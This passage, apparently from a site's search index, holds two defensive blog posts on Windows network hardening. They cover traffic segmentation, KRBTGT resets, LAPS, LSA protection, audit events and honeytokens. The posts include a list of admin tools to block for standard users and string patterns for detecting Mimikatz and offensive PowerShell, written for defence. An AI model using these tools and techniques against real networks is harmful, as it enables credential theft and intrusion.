information required to make an intelligent decision.","title":"Tools are only Enablers"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#policies-and-procedural-nightmares","text":"Cumbersome policies and procedures elongate the process for implementing timely and effective defensive mitigations. All interviewed system, network and defensive staff identified longstanding issues with receiving approval to implement change and the timeliness of any approvals received. This concern has been relayed throughout the industry for years. If policy and procedures are primary inhibitors to the successful defense of our networks, policy and procedures must be modified to accommodate the need. If detailed, the number of existing problem sets, vulnerabilities, and operational requirements far exceed any realistic ability to read, digest and act in a timely manner. The four problem sets listed above are of high importance as they are the foundation to all other sets. Each organization must begin addressing methods for limiting a threat's actions without increasing complexity, impacting the way in which systems and networks operate by design (user work-flow), or chasing ephemeral vulnerabilities. I'm left asking myself, why would we (the IT and security community) continue down the same ineffective paths, but continuously expect different results? While meeting compliance requirements does have an extremely valuable effect on security, the next section provides recommendations that would benefit any organization far more. Each of the observations and recommendations are the result of many, many efforts. The recommendations can be applied to any and all networks. Some networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such.","title":"Policies and Procedural Nightmares"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#client-to-client-communication","text":"Clients rarely need to communicate amongst themselves. Over a roughly eighteen-year period and hundreds of various networks, less than a handful of architectures have had requirements for client-to-client communication (most due to application design failures/features).","title":"Client-to-client communication"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations","text":"Of the systems and networks evaluated in recent years, none have required client-to-client communications. In fact, most have already implemented some type of host-based firewall. Yet in every network evaluated to date, all have been configured to allow client-to-client communication. Often the systems, network and defensive teams were unaware that such communications were allowed. In other instances administrative functions were identified as reasons for allowing communication. Example: During review, each network staff identifies that host-based firewalls have been implemented; however, initiating a connection to other clients using multiple ports and protocols has always been successful. Most often the staff cite requirements for system and network administration using Server Message Block (SMB), Remote Desktop Protocol (RDP) or another Remote Administration Tool (RAT). In several instances, security tools were also identified as reasoning for allowing client-to-client communications. Note There are multiple methods of allowing communications for administrative purposes only when required and should never be allowed perpetually.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-prevent-client-to-client-communication","text":"Simply implement and configure host and network based firewalls, IPTables, Access Control Lists (ACLs), etc. Leverage any and all capabilities of the network and organization. Preventing these communications limits a threat's ability to move freely throughout the network, reduces the likelihood of privileged account discovery, forces an increase in time and effort (more activities and artifacts), and therefore can increase the defender's ability to detect. Note Effective configuration of host based firewalls requires a thorough understanding of what network traffic should occur (what does normal look like?).","title":"Recommendation: Prevent client-to-client communication"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#server-to-client-communication","text":"Most client-server designs require a client to request information from a server. Experience has provided few instances where a server should initiate communications to a client.","title":"Server-to-client communication"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_1","text":"Of the networks evaluated, none have required server-to-client communications. Yet in every network evaluated to date, all have been configured to allow server-to-client communication. A common threat action is to leverage a server's ability to communicate with clients or segments to move through a network. This often allows the threat to access targets or bridge network segments even when segmentation has been properly implemented.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-prevent-server-to-client-communication","text":"Assuming the network has prevented client-to-client communications, the only option a threat has is to attempt access to a server. Given this scenario, it is more than feasible to limit a server's ability to initiate communications with a client. This recommendation limits the threat's ability to move from workstation, to a server and back to another workstation. When connections to clients are attempted, those should stand out as indicators of malicious activity. The most common IT staff concern with this implementation is malfunctioning or broken clients. This is a perfect example of where security implementations assist with the overall health of the network. If a client cannot initiate communications with the server, the client has other issues. This should be cause for investigation and correction rather than simply forcing connections from the server. Another common concern is the ability to \"push\" software, updates, etc. from the server. This is another instance where best practices are not being followed. A client should always request from a server. If deploying software or updates, the client should be notified when communicating with the server (via policy, configurations, etc.) and pull the respective requirements. Note In this context, a server is a functional role rather than a type of device.","title":"Recommendation: Prevent server-to-client communication"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#outbound-server-communications","text":"With very few exceptions, servers should never call outside the network.","title":"Outbound Server Communications"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_2","text":"Of the networks evaluated, all have had servers that allow communication with external (non-organizational) systems. This communication allows a threat to exfiltrate data directly from a server in which it has gained access. It also allows data restricted to certain network segments to be moved through a server and out of the network, often without detection.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-block-outbound-server-communications","text":"There are few instances where a server needs to communicate with a system external to the network. These are exceptions and should be managed to allow only connections to the required external asset or IP and allow only the use of required ports and protocols. All other outbound communications from servers should be blocked. This implementation combined with the limits between clients and server-to-client exponentially increases the difficulty of lateral movement and command and control. Should your internal Domain Controller manage the server in the DMZ? Of course not, but how many organization effectively control communication paths?","title":"Recommendation: Block outbound server communications"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#cached-administrative-credentials","text":"Cached credential discovery is a common and primary method in which threats escalate privileges. Cached credentials are simply credentials temporarily stored for use by the system in which they reside. When administrative access for the current activity or session ends, the cached credential is no longer required.","title":"Cached administrative credentials"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_3","text":"Of the networks evaluated, all have had cached administrative credentials present. These credentials are stored in memory when system and network administrators perform maintenance functions, when helpdesk personnel perform user support and when a tool is used to perform an automated task. This is a common problem on virtually all networks and the reason why a threat will leverage this functionality.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-clear-cached-administrative-credentials","text":"Clearing credentials is relatively easy to do, yet is not often done. A few simple registry changes and requiring administrators to reboot (mainly workstations/clients) after using elevated accounts is a great step forward in limiting cached credentials. Also, forcing the use of Remote Desktop Credential Guard and Restricted Admin (see client-to-client above) has proven to be helpful in limitations; however, depending upon function, there may still be cached credentials present. It is recommended to always reboot after administrative functions. Note There are also several methods for injecting invalid credentials into memory for use as indicators. These HoneyTokens can be used as indicators of malicious activity.","title":"Recommendation: Clear cached administrative credentials"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#krbtgt-domain-kerberos-account","text":"By now most have heard of Golden Tickets (GT) and Silver Tickets (ST) created via the domain KRBTGT (Domain Kerberos) account's NTLM hash. These tickets can be valid for extremely long periods of time and allow access to domain resources even after administrative credentials have been changed.","title":"KRBTGT (Domain Kerberos Account)"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_4","text":"Although many security professionals understand the GT/ST concept, most standard IT staff either don't know or are unclear on how they work. Many of the organizations evaluated have never reset the KRBTGT account. Of the few that have, many only reset once. This first reset does change the credential; however, the initial reset also creates a \"backup\". Due to this functionality, the KRBTGT account must be reset twice to flush old credentials completely. Only after the second reset are existing Golden and Silver Tickets rendered useless.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-reset-the-krbtgt-account","text":"Reset the KRBTGT account twice within a limited time-frame (36-48 hours apart is recommended) followed by the changing of all administrative credentials. These resets limit a threat's ability to maintain access after credential changes. The administrative credential change is highly recommended and should be required. If the threat has a valid GT they have obtained valid credentials. A new Golden Ticket can be created after the KRBTGT reset if credentials have not been changed (defeating the purpose of the KRBTGT reset). This process should be completed periodically (no less frequently than quarterly). Note Anyone using assets not on the network during the resets (traveling, out of office, etc.) will likely need help authenticating when reconnecting.","title":"Recommendation: Reset the KRBTGT Account"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#sensitive-items","text":"Sensitive items include credentials, configuration files, Privacy of Information Act (PIA) data, Intellectual Property, anything close-hold or critical to business operations, etc.","title":"Sensitive Items"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_5","text":"In every network evaluated, multiple instances of sensitive items were discovered. Items were found in many different locations to include organizational file shares, personal file shares, workstation directories, server directories, organizational websites and often on external (non-organizational) websites. More often than not, they are available to anyone with access to the network. These items provide the threat either the information for the target or the information required to obtain access to the target.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-perform-a-sensitive-items-review","text":"Perform frequent search and discovery activities for critical items stored across the network and network systems. With the exception of credential storage, there are legitimate reasons for storing information such as configurations, diagrams, business information, etc. on the network. These need special focus to determine where they are stored, who has access and if they have any authenticators or credentials. Challenge: Perform a string search for \"pass\", \"assw\", \"pwd\", \"key\", and \"Type 7\" on the network. You may be amazed at what is discovered.","title":"Recommendation: Perform a sensitive items review"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#ports-protocols-and-services","text":"Ports, protocols and services (PPS) are simply the technical means by which networks communicate.","title":"Ports, Protocols, and Services"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_6","text":"In every network evaluated, PPS were not limited to only those required. This applies to internal as much as external communications. Many organizations rely on firewalls to limit specific ports and protocols from external sources; however, they have limited controls on what PPS traverse the internal network. Even when internal firewalls are in place, traffic is often not restricted appropriately.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-block-and-disable-non-required-ports-protocols-and-services-pps","text":"Both internal and external systems and network devices should block PPS that aren't required for the network. Limit PPS to only what is required for each specific system. Think of this as \"PPS white-listing\". Does the network have a need for port 5900 to traverse the entire network? Or is there a need for port 5900 to a specific system? Does the network really need IPX/SPX, WPAD, LLMNR, and NetBIOS enabled? Controlling PPS limits a threat's range of capabilities and increases chances of detection. Note Firewalls (network or host based) are listed above as an easy example. Network based firewalls are simply traffic control devices that allow ingress and egress traffic based upon configuration. Host based firewalls do the same for individual hosts.","title":"Recommendation: Block and Disable non-required ports, protocols, and services (PPS)"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#accounts-and-privileges","text":"Accounts, group memberships, and privileges are primary enablers for most threat actions. Effective management and control greatly limits a threat's ability to execute within a network.","title":"Accounts and privileges"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_7","text":"Many organizations have user accounts with some level of elevated access, administrative accounts that administer multiple resource types, and groups with specific permissions nested within other groups with higher level permissions. Each of these enable a threat to freely escalate privileges to a level required to meet their objective. Consider this Concept A threat has the ability to elevate a standard user to one of privileged access, elevate a privileged access account to local administrator, and/or elevate local administrator to domain administrator. If a threat has the ability to escalate a standard user account to that of DA, so does every other user on the network.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-1-implement-separation-of-accounts-and-privileges","text":"Ensure separation of user, privileged access, and administrator accounts. Also ensure administrative accounts can only administer within its area of responsibility. System administrators should only administer systems and not have access to servers. Server administrators should only be able to administer servers and not have access to workstations. Domain administrators should not have access to administer servers or workstations. Users should be limited to only what is required to perform daily tasks. Standard users often do not require elevated privileges on a daily basis. In rare scenarios where a user needs elevation often, require the use of a secondary account with only the access required and no external communications ability. Likewise, administrators shouldn't be using elevated accounts for daily tasks. As a general rule all elevated accounts should be restricted from external communications (including internet and email). Also, consider having separate dedicated administrative systems with no email client, Internet browser, timecard access, document editing, any external communication, etc.","title":"Recommendation 1: Implement separation of accounts and privileges"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-2-ensure-group-permissions-are-appropriately-identified-and-mapped","text":"This recommendation has multiple applications; however, the main focus is nested groups and permissions. Nesting is a common problem in nearly every windows based-network in existence. Is it easier to troubleshoot permissions or give a user membership to a group to solve the problem? We've all been there. Consider this Concept Group 3 has domain access. Group 2 has server access. Group 1 has workstation access. Group 0 are domain users in a specific division. If a member of Group 0 is assigned to Group 1 due to an elevation requirement, the chances of that user being able to escalate to domain administrator (Group 3) are high. This occurs simply because at least one member of Group 1 is likely a member of Group 2, and at least one member of Group 2 is likely a member of Group 3. It may require a bit of work, but these are the paths and nested permissions a threat will leverage to gain elevated access.","title":"Recommendation 2: Ensure group permissions are appropriately identified and mapped."},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-3-implement-microsoft-local-administrator-password-solution-laps","text":"LAPS provides automated local administrator account management for every computer in Active Directory. A client-side component generates a random password, updates the LAPS password on the Active Directory computer account, and sets the password locally. LAPS configuration is managed through Group Policy which provides the values for password complexity, password length, local account name for password change, password change frequency, etc.","title":"Recommendation 3: Implement Microsoft Local Administrator Password Solution (LAPS)"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-4-rudimentary-nix-two-factor-authentication-2fa","text":"Many organizations have issues with credential reuse and implementation of Two Factor Authentication (2FA) in *nix based systems especially in off-line or closed networks. A very rudimentary but simple implementation of 2FA is the use of ssh key-files. The user generates a key-file that requires a password for use. The system administrator configures the system to require a key and password. The user now must use the password protected key-file to connect and the system password to complete authentication.","title":"Recommendation 4: Rudimentary *nix Two Factor Authentication (2FA)"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#account-and-event-activity","text":"Account and event activity should be major factors in identifying potential issues or threats within a network. Unfortunately, these are often logged but rarely monitored effectively.","title":"Account and Event Activity"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_8","text":"Account and event activity collection is commonly identified as a compliance item and treated as a box to be checked. Multiple organizations have successfully configured logging and event forwarding and have alerts to match each event. Yet a common issue discovered in every organization to date is the unreasonable number of notifications or alerts received. Defensive staff are unable to follow every thread to a root cause due to time constraints and the vast number of alerts received. If a dedicated defensive team is unable to run every alert to ground, the alerts, logging, and collection has not been appropriately configured and tuned.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-1-monitor-login-failures-and-successes","text":"Short and simple. Multiple fails followed by a success indicates bad things. Many organizations focus on the failures and only respond when a target number of failures occur (i.e. three failed attempts per account or 300 failed attempts total). Consider this Concept A threat has a password discovered via open source intelligence. The account is unknown; however, the password file has a recent date. The threat performs one validation per account for all accounts on the network (or Outlook Web Access or external SharePoint Portal). After twenty attempts one account has the same password and successfully authenticates. This action met neither of the conditions for alerting. Would this action be identified?","title":"Recommendation 1: Monitor login failures and successes"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-2-consider-implementing-a-second-instance-or-dashboard-or-properly-tuning-the-primary","text":"Given that most organizations have a compliance requirement to log all events, it is unreasonable to discard all incoming data. It is feasible to tune the primary or a second instance, dashboard, etc. to look specifically for the indicators as described above. Example: The network has been configured to prevent client-to-client communications. If client-to-client communications are attempted, an alert provides notification. !!! Note: The example action should occur for the eight or ten actions common to most threats. Eight or ten possible scenarios are much easier to monitor and maintain and provide a realistic view of potential threats (outsider or insider) within the network.","title":"Recommendation 2: Consider implementing a second instance or dashboard (or properly tuning the primary)"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#application-whitelisting","text":"Application Whitelisting is the process of identifying approved software, allowing only those applications to run on a system, and blocking all others.","title":"Application Whitelisting"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_9","text":"Application Whitelisting is extremely useful in securing a network; however, for any organization with a larger footprint, dispersed locations and a diverse set of business requirements; it can be cumbersome to configure and maintain. In addition, many Application Whitelisting tools and techniques have been bypassed or leveraged to execute malicious code and security researchers continue to discover new ways of doing so. Application Whitelisting provides some value to the overall security of a network, but isn't the silver bullet everyone expects. Combined with other recommendations Application Whitelisting provides an exponential increase in time and difficulty to a threat.","title":"Observations"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-application-whitelisting","text":"Implement Application Whitelisting only after all of the prior recommendations have been implemented. An interim strategy (until Application Whitelisting can be fully implemented) may be to prevent standard user execution of specific applications such as: arp, at, certutil, cscript, cmd, dsquery, hostname, ipconfig, msbuild, nbtstat, net, netsh, netstat, nslookup, ntdsutil, pcalua, ping, powershell, psexec, reg, regasm, regedit, regedt32, regsvr32, regsvcs, rundll32, set, sc, schtasks, systeminfo, tasklist, tracert, whoami, wmic, wscript, wsmprovhost, etc. Do standard users normally run any of the preceding commands? Should they? Most users do not use these commands. If they do, why? Most organizations have historically focused on prevention (which is why we consistently see networks with a harder exterior and soft chewy center). While prevention is a huge concern, complete protection will never be possible. Although preventative in nature, the major benefit of the listed recommendations is relative ease of detection. Each activity performed outside the baseline should stand out as indicators of malicious activity. My closing recommendation is for all organizations and security professionals to adopt the concept of \"Assumed Breach\" . An Assumed Breach mentality accepts that a network is currently, or will eventually be, compromised. Prepare your networks and business functions as if there's a known or impending threat to the network. I'll expand more on this in future posts. If a standard user was given administrative credentials while sitting at their workstation, what could they do? What did you come up with? Should a user be able to perform those actions?","title":"Recommendation: Application Whitelisting"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/","text":"Threat Mitigation Strategies: Part 2 \u00b6 James Tubberville | May 15, 2018 | Tweet This Post: The following information was composed by Andrew Chiles (@andrewchiles), Joe Vest (@joevest) and myself (@minis_io) for quick and easy reference. Much of it was pulled together from a variety of sources with attempts to provide references for each. This post is intended to be more of a brain dump rather than a complete technical breakout. As discussed in the Threat Mitigation Strategies Part 1 http://threatexpress.com/2018/01/threat-mitigation-strategies-observations-recommendations/ , there is commonality between the inherent weaknesses and the actions a threat might perform within an information system or network. The following recommendations and informational snippets were derived from many offensive and defensive efforts that continue to support these correlations. Each recommendation and snippet can and very likely should be applied to all networks. Some systems and networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such. Also note the exact syntax and use will vary with the network construct, operating system/version, and legal/regulatory security requirements. Account Management \u00b6 Accounts should have specific roles. General Guidelines Domain Administrators perform management of Windows Active Directory. They do not manage servers or workstations. Server Administrators perform management of servers. They do not manage workstations. Workstation Administrators perform management of workstation. They do not manage servers. Privileged accounts should NOT have external communications (Internet, email, etc.) Standard users should NOT have elevated access (use secondary accounts if required) Adjust Password Policy \u00b6 Adjust password policy to conform to \"800-63-3: Digital Identity Guidelines\". Remove periodic password change requirements Passwords should only be changed if forgotten or suspected compromise Warning I don't agree with the two above and recommend maintaining a reasonable duration for password change requirements Remove complexity requirements (Upper/Lower/Number/Special character) Require a minimum password length of A minimum length of 8 is required by NIST, but minimum of 16 is recommended for user accounts A minimum length of 20 (28+ is recommended) for service accounts Suggest the use of pass-phrases (such as four random lowercase words). Example: \"correct horse battery staple!\" Screen passwords against password compromise lists Screen passwords against keyboard walks Note Meeting the complexity recommendation may not be possible due to current compliance requirements. Setting the Password Policy using GPO \u00b6 Edit the \"Domain Password Policy\" GPO to configure the appropriate password length 1 2 3 1 . Open Group Policy 2 . Computer Configurations > Policies > Windows Settings > Security Settings > Account Policy > Password Policy 3 . Minimum password length : 20 KRBTGT password reset \u00b6 Regularly reset the KRBTGT password to minimize stolen credentials from be used in the future. 1 2 3 4 Review the reset tool guide \" Guide to Running New-CtmADKrbtgtKeys \" ( see references ) Use the the PowerShell script New - CtmADKrbtgtKeys . ps1 to reset the KRBTGT Wait 24 hours and execute the change a 2 nd time Recommend running on a regular schedule . This should be monthly , quarterly ( at most ) , or after an incident where compromise is suspected . References https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51 https://adsecurity.org/?p=483 Use LAPS to manage the local Administrator (RID 500) password \u00b6 Install KB2871997 Follow details outlined at https://adsecurity.org/?p=1790 References https://adsecurity.org/?p=1790 https://adsecurity.org/?p=559 Implement Managed Service Accounts \u00b6 Windows Server 2008 R2 and Windows 7 introduced Managed Service Accounts. MSA's allow you to create an account in Active Directory that is tied to a specific computer. That account has its own complex password (see password policy) and is maintained automatically. This means that an MSA can run services on a computer in a secure and easy to maintain manner, while maintaining the capability to connect to network resources as a specific user principal. Group level MSA's can be deployed in Windows 2012 or higher Domains. Reference https://blogs.technet.microsoft.com/askds/2009/09/10/managed-service-accounts-understanding-implementing-best-practices-and-troubleshooting/ https://technet.microsoft.com/en-us/library/hh831782.aspx Protected LSA \u00b6 Protect LSA Via policy \u00b6 1 2 1 . Advanced Audit Policy Configuration > Object Access > Audit Kernel Object 2 . Enable SACL L \"S:(AU;SAFA;0x0010;;;WD)\" and 1 2 3 4 1 . Computer Configuration > Preferences > Windows Settings 2 . Right - click Registry > New > Registry Item 3 . Hive HKLM > Path SYSTEMCurrentControlSetControlLsa 4 . DWORD value RunAsPPL = 00000001 Note LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (\"!+\"). Protect LSA Via Registry Entry \u00b6 Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD RunAsPPL = 00000001 or reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa / v RunAsPPL / d 00000001 / t REG_DWORD Windows Event Forwarding (WEF) reads any operational or administrative event log on a device in your organization and forwards the events you choose to a Windows Event Collector (WEC) server. Windows Logs \u00b6 The Windows Logs category includes the logs that were available on previous versions of Windows: the Application, Security, and System logs. It also includes two new logs: the Setup log and the ForwardedEvents log. Windows logs are intended to store events from legacy applications and events that apply to the entire system. Application log \u00b6 The Application log contains events logged by applications or programs. For example, a database program might record a file error in the application log. Program developers decide which events to log. Security log \u00b6 The Security log contains events such as valid and invalid logon attempts, as well as events related to resource use, such as creating, opening, or deleting files or other objects. Administrators can specify what events are recorded in the security log. For example, if you have enabled logon auditing, attempts to log on to the system are recorded in the security log. Setup log \u00b6 The Setup log contains events related to application setup. System log \u00b6 The System log contains events logged by Windows system components. For example, the failure of a driver or other system component to load during startup is recorded in the system log. The event types logged by system components are predetermined by Windows. ForwardedEvents log \u00b6 The ForwardedEvents log is used to store events collected from remote computers. To collect events from remote computers, you must create an event subscription. To learn about event subscriptions, see Event Subscriptions. Applications and Services Logs \u00b6 Applications and Services logs are a new category of event logs. These logs store events from a single application or component rather than events that might have system wide impact. This category of logs includes four subtypes: Admin, Operational, Analytic, and Debug logs. Events in Admin logs are of particular interest to IT Professionals using the Event Viewer to troubleshoot problems. Events in the Admin log should provide you with guidance about how to respond to them. Events in the Operational log are also useful for IT Professionals, but they are likely to require more interpretation. Admin and Debug logs are not as user friendly. Analytic logs store events that trace an issue and, often, a high volume of events are logged. Debug logs are used by developers when debugging applications. Both Analytic and Debug logs are hidden and disabled by default. To make these logs visible, follow the steps in Show or Hide Analytic and Debug Logs. To enable these logs, follow the steps in Enable Analytic and Debug Logs. Admin \u00b6 These events are primarily targeted at end users, administrators, and support personnel. The events that are found in the Admin channels indicate a problem and a well-defined solution that an administrator can act on. An example of an admin event is an event that occurs when an application fails to connect to a printer. These events are either well documented or have a message associated with them that gives the reader direct instructions of what must be done to rectify the problem. Operational \u00b6 Operational events are used for analyzing and diagnosing a problem or occurrence. They can be used to trigger tools or tasks based on the problem or occurrence. An example of an operational event is an event that occurs when a printer is added or removed from a system. Analytic \u00b6 Analytic events are published in high volume. They describe program operation and indicate problems that cannot be handled by user intervention. Debug \u00b6 Debug events are used by developers troubleshooting issues with their programs. Advanced Audit Policy should focus on these (in no specific order) \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 1 . A logon was attempted using explicit credentials : Event 552 and 4648 2 . A member was added to a security - enabled global group : Event 4728 3 . A member was added to a security - enabled local group : Event 4732 4 . A member was added to a security - enabled universal group : Event 4756 5 . An account failed to log on : Event 529 - 539 4625 ( followed by a success 4624 ) 6 . LogonAccount / TargetUserName is Administrator ( Using RID - 500 ): Event 4624 , 4776 7 . Scheduled Task Creation : Event 602 , 4698 8 . Log was cleared : Event 104 and 1102 , 4949 9 . EMET dies : Event 1 and 2 10 . Application Error or Hang : Event 1000 and 1002 11 . Windows Defender Errors : Event 1005 , 1006 , 1008 , 1010 , 2001 , 2003 , 2004 , 3002 , 5008 12 . New process : User NOT admin and Event 4688 ( arp , at , bcdedit , certutil , cscript , cmd , dsquery , hostname , ipconfig , msbuild , nbtstat , net , netsh , netstat , nslookup , ntdsutil , pcalua , ping , powershell , psexec , reg , regasm , regedit , regedt32 , regsvr32 , regsvcs , rundll32 , set , sc , schtasks , systeminfo , tasklist , tracert , whoami , wmic , wscript , wsmprovhost ) 13 . Service creation / install : Event 601 , 4697 , 7045 14 . Service changes : Event 7040 15 . File share access / attempts ( C $ , ADMIN $ , IPC$ ): Event 5140 16 . PowerShell execution and module loading : Event 501 and 4104 respectively 17 . External media detection : All Events 7045 , 10000 , 10001 or 10002 , 10100 , 20001 , 20003 , 24576 , 24577 , 24579 18 . User creation : Event 4720 Tip It's a good idea to hide/exclude these events except specific conditions (See caveats above) as these are consistently rolling: 4688,4689,5156,5158 Enable Command Line Logging (Must include MS15-015 KB3031432) \u00b6 HKLMSoftwareMicrosoftWindowsCurrentVersionPoliciesSystemAudit DWORD ProcessCreationIncludeCmdLine_Enabled = 1 Account HoneyToken (manual) \u00b6 echo \"crazypassword\" | runas / u : yourdomain . comXadmin / netonly ipconfig Consider a check on 4625 where Xadmin is found Also add hash of crazypassword to IDS and alert when seen Account HoneyToken (network) \u00b6 Invoke - HoneyCreds . ps1 Reference: https://github.com/Ben0xA/PowerShellDefense/blob/master/Invoke-HoneyCreds.ps1 SPN HoneyToken \u00b6 Set - ADUser watchaccount - ServicePrincipalNames @ { Add = \" MSSQLSvc / sql1 : 1433 \u2033} PowerShell Module Logging \u00b6 Ensure all Windows systems have PowerShell v3 or newer. Newer versions of PowerShell have better logging features, especially PowerShell v5. This will log all PowerShell activity including all PowerShell modules. Enable PowerShell Module Logging 1 2 3 4 1 . Open Group Policy 2 . Computer Configuration > Policies > Administrative Templates > Windows Components > Windows PowerShell 3 . Turn on Module Logging 4 . Enter \"*\" and click OK . ` Log Parsing \u00b6 If enabled, PowerShell activity will be logged to the Microsoft-Windows-PowerShell/Operational Log. Push or pull these events to a central logging server (via Windows Event Forwarding or similar) or SIEM. Parse PowerShell events for the following Mimikatz indicators \u00b6 1 2 3 4 5 \"System.Reflection.AssemblyName\" \"System.Reflection.Emit.AssemblyBuilderAccess \" \"System.Runtime.InteropServices.MarshalAsAttribute\" \"TOKEN_PRIVILEGES\" \"SE_PRIVILEGE_ENABLED\" ` Detecting Offensive PowerShell Tools \u00b6 Many PowerShell offensive tools use the following calls which are logged in PowerShell Module Logging. 1 2 3 4 5 6 7 8 9 \"GetDelegateForFunctionPointer\" \"System.Reflection.AssemblyName\" \"System.Reflection.Emit.AssemblyBuilderAccess\" \"System.Management.Automation.WindowsErrorReporting\" \"MiniDumpWriteDump\" \"TOKEN_IMPERSONATE\" \"TOKEN_DUPLICATE\" \"TOKEN_ADJUST_PRIVILEGES\" \"TOKEN_PRIVILEGES\" ` Reference https://github.com/palantir/windows-event-forwarding/tree/master/group-policy-objects https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Subscriptions/samples https://docs.microsoft.com/en-us/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection https://github.com/MicrosoftDocs/windows-itpro-docs/blob/master/windows/threat-protection/use-windows-event-forwarding-to-assist-in-instrusion-detection.md Disable Windows Legacy & Typically Unused Features \u00b6 The reference (Securing Windows Workstations: Developing a Secure Baseline) located at https://adsecurity.org/?p=3299 contains a wealth of information to help reduce security risks in a Windows Domain. Key mitigations are highlighted below. Force Group Policy to reapply settings during \"refresh\" \u00b6 Computer Configuration > Policies > Administrative Templates > System > Group Policy > Configure security policy processing Set to Enabled Also check the box for \" Process even if the Group Policy objects have not changed \" It's also recommended to configure the same settings for each of the following: Computer Configuration, Policies, Administrative Templates, System, Group Policy, Configure registry policy processing Computer Configuration, Policies, Administrative Templates, System, Group Policy, Configure scripts policy processing As well as any other policy settings as needed. Disable Unneeded Services \u00b6 The document Service-management-WS2016.xlsx contains a list default services, their state, use, and if it is safe to disable. Review the Services outlined in the document Service-management-WS2016.xlsx Create a list of service to disable, and enforce via GPO Disable Net Session Enumeration (NetCease) \u00b6 This hardening process prevents attackers from easily getting some valuable recon information to move laterally within their victim's network. Run the NetCease PowerShell script on Server Include DCs, Fileservers, or other servers where Session information may be used by and attacker for enumeration References https://gallery.technet.microsoft.com/Net-Cease-Blocking-Net-1e8dcb5b https://adsecurity.org/?p=3299 Disable WPAD \u00b6 Web Proxy Auto-Discovery Protocol (WPAD) is \"a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL.\" Disable WPAD via Group Policy by deploying the following registry change: HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsWpad New DWORD ( 32 - Bit Value ) called \"WpadOverride\" and set to \"1\" Disable the service \"WinHTTP Web Proxy Auto-Discovery Service\" Computer Configuration > Policies > Windows Settings > Security Settings > System Services Set WinHTTP Web Proxy Auto - Discovery Service to Disabled Note: Partial mitigation of WPAD issues is possible by installing the Microsoft patch KB3165191 (MS16-077). This patch hardens the WPAD process and when the system responds to NetBIOS requests. Disable LLMNR \u00b6 Link-Local Multicast Name Resolution (LLMNR): In a nutshell, Link-Local Multicast Name Resolution (LLMNR) resolves single label names (like: COMPUTER1), on the local subnet, when DNS is unable to resolve the name. Disable LLMNR via Group Policy by deploying the following: Group Policy : Computer Configuration / Administrative Templates / Network / DNS Client Set \"Turn Off Multicast Name Resolution\" to \"Enabled\" Disable WDigest \u00b6 WDigest provides support for Digest authentication which is: \"An industry standard that is used in Windows Server 2003 for Lightweight Directory Access Protocol (LDAP) and Web authentication. Digest Authentication transmits credentials across the network as an MD5 hash or message digest.\" Prior to Windows 8.1 and Windows Server 2012 R2, Wdigest was enabled which placed the user's \"clear text\" password in LSASS memory space in order to support basic authentication scenarios. Windows 8.1 and Windows Server 2012 R2 and newer have WDigest disabled by default. Disable WDigest via Group Policy by deploying the following registry change: HKEY_LOCAL_MACHINESystemCurrentControlSetControlSecurityProvidersWdigestUseLogonCredential = \"0\" References https://adsecurity.org/?p=3299 Remove the use of NTLM v1 \u00b6 Windows Server 2008 R2 included features to help identify NTLM authentication use on the network. It is important to completely remove these legacy authentication protocols since they are insecure. Removal and prevention of LM and NTLMv1 use can be activated through the use of Group Policy security settings. Plan to move to NTLMv2 and Kerberos at the least, with the 